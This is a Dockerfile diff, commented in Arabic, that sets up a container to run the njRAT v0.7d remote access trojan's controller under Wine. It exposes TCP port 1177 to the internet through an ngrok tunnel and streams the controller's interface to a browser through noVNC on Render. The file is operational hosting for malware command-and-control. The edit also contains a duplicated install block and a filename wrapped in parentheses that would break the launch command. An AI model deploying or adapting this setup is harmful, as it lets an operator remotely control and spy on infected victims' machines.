@@ -15,6 +15,20 @@ RUN apt-get update && apt-get install -y \
     curl \
     gnupg \
     && rm -rf /var/lib/apt/lists/*
+    # تمكين معمارية 32-بت
+RUN dpkg --add-architecture i386 && \
+    apt-get update && apt-get install -y \
+    xvfb \
+    x11vnc \
+    novnc \
+    websockify \
+    fluxbox \
+    wine32 \
+    wine64 \
+    winetricks \
+    curl \
+    gnupg \
+    && rm -rf /var/lib/apt/lists/*
 
 # تثبيت أداة Ngrok الرسمية عبر مستودع الحزم المعتمد لنظام Ubuntu
 RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg && \
@@ -43,7 +57,7 @@ ngrok tcp 1177 &\n\
 \n\
 # 3. تشغيل برنامج الـ .NET باستخدام محاكي Wine في الخلفية\n\
 # (تأكد من تغيير اسم الملف "YourProgram.exe" للاسم الحقيقي لملفك في GitHub)\n\
-wine /app/njRAT v0.7d.exe &\n\
+wine /app/(njRAT v0.7d.exe) &\n\
 \n\
 # 4. تشغيل خادم noVNC لبث واجهة البرنامج الرسومية على متصفحك عبر منفذ Render\n\
 /usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
